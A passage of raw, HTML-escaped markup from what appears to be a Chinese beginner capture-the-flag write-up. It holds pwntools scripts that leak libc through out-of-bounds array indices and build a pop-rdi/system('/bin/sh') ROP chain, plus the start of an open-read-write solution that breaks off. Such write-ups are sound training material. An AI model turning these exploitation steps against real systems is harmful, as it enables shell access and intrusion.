class=&#34;string&#34;&gt;&amp;#x27;debug&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;mylibc = ELF(&lt;span class=&#34;string&#34;&gt;&amp;#x27;/root/pwn/glibc-all-in-one/libs/2.31-0ubuntu9.7_amd64/libc.so.6&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;io = process(&lt;span class=&#34;string&#34;&gt;&amp;quot;./pwn&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;context.terminal = [&lt;span class=&#34;string&#34;&gt;&amp;#x27;tmux&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;splitw&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;-h&amp;#x27;&lt;/span&gt;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#gdb.attach(io)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;read1&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;index&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    io.sendlineafter(&lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;gt; &amp;quot;&lt;/span&gt;,&lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    io.sendlineafter(&lt;span class=&#34;string&#34;&gt;&amp;quot;Idx:&amp;quot;&lt;/span&gt;,&lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(index))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    io.recvuntil(&lt;span class=&#34;string&#34;&gt;&amp;#x27;The num: &amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    low_addr=&lt;span class=&#34;built_in&#34;&gt;int&lt;/span&gt;(io.recvuntil(&lt;span class=&#34;string&#34;&gt;&amp;#x27;\n&amp;#x27;&lt;/span&gt;,drop=&lt;span class=&#34;literal&#34;&gt;True&lt;/span&gt;),&lt;span class=&#34;number&#34;&gt;10&lt;/span&gt;) &lt;span class=&#34;comment&#34;&gt;# 这样就可以接收到全部了,不用考虑长度,到\n截止,10进制接收&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    io.sendlineafter(&lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;gt; &amp;quot;&lt;/span&gt;,&lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    io.sendlineafter(&lt;span class=&#34;string&#34;&gt;&amp;quot;Idx:&amp;quot;&lt;/span&gt;,&lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(index+&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    io.recvuntil(&lt;span class=&#34;string&#34;&gt;&amp;#x27;The num: &amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    high_addr=&lt;span class=&#34;built_in&#34;&gt;int&lt;/span&gt;(io.recvuntil(&lt;span class=&#34;string&#34;&gt;&amp;#x27;\n&amp;#x27;&lt;/span&gt;,drop=&lt;span class=&#34;literal&#34;&gt;True&lt;/span&gt;),&lt;span class=&#34;number&#34;&gt;10&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; high_addr*(&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;**&lt;span class=&#34;number&#34;&gt;32&lt;/span&gt;)+low_addr&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;write1&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;index,num&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    high_num = &lt;span class=&#34;built_in&#34;&gt;int&lt;/span&gt;(num/(&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;**&lt;span class=&#34;number&#34;&gt;32&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    low_num  = num%(&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;**&lt;span class=&#34;number&#34;&gt;32&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    io.sendlineafter(&lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;gt; &amp;quot;&lt;/span&gt;,&lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    io.sendlineafter(&lt;span class=&#34;string&#34;&gt;&amp;quot;Idx:&amp;quot;&lt;/span&gt;,&lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(index))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    io.sendlineafter(&lt;span class=&#34;string&#34;&gt;&amp;quot;Num:&amp;quot;&lt;/span&gt;,&lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(low_num))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    io.sendlineafter(&lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;gt; &amp;quot;&lt;/span&gt;,&lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    io.sendlineafter(&lt;span class=&#34;string&#34;&gt;&amp;quot;Idx:&amp;quot;&lt;/span&gt;,&lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(index+&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    io.sendlineafter(&lt;span class=&#34;string&#34;&gt;&amp;quot;Num:&amp;quot;&lt;/span&gt;,&lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(high_num))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;libcbase = read1(&lt;span class=&#34;number&#34;&gt;262&lt;/span&gt;) - &lt;span class=&#34;number&#34;&gt;0x240b3&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#print(hex(libcbase3))&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;pop_rdi = libcbase +&lt;span class=&#34;number&#34;&gt;0x000000023b72&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;system = libcbase + mylibc.symbols[&lt;span class=&#34;string&#34;&gt;&amp;#x27;system&amp;#x27;&lt;/span&gt;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;binsh = libcbase +&lt;span class=&#34;number&#34;&gt;0x00000000001b45bd&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;write1(&lt;span class=&#34;number&#34;&gt;262&lt;/span&gt;,pop_rdi)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;write1(&lt;span class=&#34;number&#34;&gt;264&lt;/span&gt;,binsh)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;write1(&lt;span class=&#34;number&#34;&gt;266&lt;/span&gt;,system)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;io.sendlineafter(&lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;gt; &amp;quot;&lt;/span&gt;,&lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;io.interactive()&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;





&lt;p&gt;&lt;font color=&#34;red&#34;&gt;这里有个大坑…栈对其? 栈平衡?  是的,需要加一个ret,不过为什么呢??&lt;/font&gt;&lt;/p&gt;
&lt;p&gt;看了一下出题人用的libc版本:GNU C Library (Ubuntu GLIBC 2.31-0ubuntu9.9)&lt;/p&gt;
&lt;p&gt;前面onegadget瞎猫碰死耗子..&lt;/p&gt;
&lt;p&gt;会什么会加载四个呢??,比如libc, 减哪个的值呢? 减最开头的&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/pwn%E5%85%A5%E9%97%A8-27-5%E6%9C%88%E4%B9%99%E9%98%9F%E6%9C%88%E8%B5%9B%E4%B8%89%E9%A2%98/image-20230522165144751.png&#34; alt=&#34;image-20230522165144751&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/pwn%E5%85%A5%E9%97%A8-27-5%E6%9C%88%E4%B9%99%E9%98%9F%E6%9C%88%E8%B5%9B%E4%B8%89%E9%A2%98/image-20230522170302148.png&#34; alt=&#34;image-20230522170302148&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;orw解法&#34;&gt;&lt;a href=&#34;#orw解法&#34; class=&#34;headerlink&#34; title=&#34;orw解法&#34;&gt;&lt;/a&gt;orw解法&lt;/h2&gt;&lt;p&gt;​		记录一下……其实没必要..&lt;/p&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;49&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;50&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;51&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;52&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;53&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;54&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;55&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;56&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;57&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;58&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;59&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;60&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;61&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;62&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;63&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;64&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;65&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;66&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;67&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;68&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;69&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;70&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;71&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;72&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;73&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;74&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;75&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;76&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;77&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;78&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;79&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;80&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;81&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;82&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;83&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;84&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;85&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;86&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;87&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;88&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;89&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;90&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;91&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;92&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;93&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;94&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;95&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;96&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;97&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;98&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;99&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;100&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;101&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;102&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;103&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;104&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;105&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;106&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;107&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;108&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;109&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;110&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;111&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;112&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;113&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;114&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;115&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;116&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;117&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;118&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;119&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;120&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;121&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;122&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;123&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;124&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;125&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;126&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;127&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;128&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;129&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;130&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;131&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;132&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;133&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;134&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;135&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;136&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;137&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;138&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;139&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;140&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;141&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;142&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;143&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;144&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;from&lt;/span&gt; pwn &lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; *&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;context(arch=&lt;span class=&#34;string&#34;&gt;&amp;#x27;i386&amp;#x27;&lt;/span&gt;,os=&lt;span class=&#34;string&#34;&gt;&amp;#x27;linux&amp;#x27;&lt;/span&gt;,log_level=&lt;span class=&#34;string&#34;&gt;&amp;#x27;debug&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;mylibc = ELF(&lt;span class=&#34;string&#34;&gt;&amp;#x27;/root/pwn/glibc-all-in-one/libs/2.27-3ubuntu1.5_amd64/libc.so.6&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;io = process(&lt;span class=&#34;string&#34;&gt;&amp;quot;./pwn&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;context.terminal = [&lt;span class=&#34;string&#34;&gt;&amp;#x27;tmux&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;splitw&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;-h&amp;#x27;&lt;/span&gt;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#gdb.attach(io)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;readone&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;index&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    io.sendlineafter(&lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;gt; &amp;quot;&lt;/span&gt;,&lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    io.sendlineafter(&lt;span class=&#34;string&#34;&gt;&amp;quot;Idx:&amp;quot;&lt;/span&gt;,&lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(index))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;writeone&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;index,content&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    io.sendlineafter(&lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;gt; &amp;quot;&lt;/span&gt;,&lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    io.sendlineafter(&lt;span class=&#34;string&#34;&gt;&amp;quot;Idx:&amp;quot;&lt;/span&gt;,&lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(index))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    io.sendlineafter(&lt;span class=&#34;string&#34;&gt;&amp;quot;Num:&amp;quot;&lt;/span&gt;,&lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(content))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;writeone(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;1852400175&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;writeone(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;6845231&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;readone(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;readone(&lt;span class=&#34;number&#34;&gt;262&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;io.recvuntil(&lt;span class=&#34;string&#34;&gt;&amp;quot;The num: &amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;addr1 = io.recv(&lt;span class=&#34;number&#34;&gt;10&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;readone(&lt;span class=&#34;number&#34;&gt;263&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;io.recvuntil(&lt;span class=&#34;string&#34;&gt;&amp;quot;The num: &amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;addr2 = io.recv(&lt;span class=&#34;number&#34;&gt;5&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#print(hex(int(addr1)))&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#print(hex(int(addr2)))&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;system = &lt;span class=&#34;built_in&#34;&gt;int&lt;/span&gt;(addr1) - &lt;span class=&#34;number&#34;&gt;231&lt;/span&gt; + &lt;span class=&#34;number&#34;&gt;0x2d799&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;libcbase = &lt;span class=&#34;built_in&#34;&gt;int&lt;/span&gt;(addr1) - &lt;span class=&#34;number&#34;&gt;0x21c87&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#print(hex(system))&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span 